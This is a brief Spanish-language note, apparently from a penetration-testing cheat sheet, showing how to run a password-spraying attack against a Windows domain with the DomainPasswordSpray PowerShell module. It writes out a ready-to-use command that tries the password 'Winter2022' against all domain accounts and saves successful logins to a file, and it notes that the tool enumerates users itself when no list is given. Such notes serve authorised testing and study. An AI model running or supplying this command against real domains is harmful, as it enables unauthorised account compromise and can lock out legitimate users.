Para hacer Password Spraying en Windows:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

Se puede especificar una lista de usuarios con `-UserList` pero si no  la ponemos la herramienta cogerá a los usuarios y nos hará una lista bastante interesante